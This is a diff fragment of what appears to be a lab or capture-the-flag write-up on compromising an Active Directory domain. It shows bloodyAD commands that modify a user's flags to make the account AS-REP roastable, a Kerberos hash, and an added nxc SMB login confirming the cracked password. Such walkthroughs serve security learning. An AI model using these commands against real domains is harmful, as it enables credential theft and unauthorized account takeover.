@@ -496,7 +496,7 @@ bloodyAD --host dc01.fragments.local -d fragments.local -u j.woods -p 'hpFqULtQo
 
 First ill make the account AS-REP roastable
 
-But now checking bloodhound the account looks disabled, this is why i couldnt dump the hash
+But now checking bloodhound the account looks disabled
 
 ```python
 bloodyAD --host dc01.fragments.local -d fragments.local -u j.woods -p 'hpFqULtQoY!' remove uac 'o.rodrigo' -f ACCOUNTDISABLE
@@ -532,5 +532,10 @@ $krb5asrep$23$o.rodrigo@FRAGMENTS.LOCAL:dedd90af65196a4b0cb853d2f8006588$a53ee4a
 ```
 
 ```python
-
+nxc smb dc01.fragments.local -u o.rodrigo -p 'nohacking!' --smb-timeout 5
+SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.29.162     445    DC01             [+] fragments.local\o.rodrigo:nohacking!
 ```
+
+The hash cracked, now this user is compromised!
+
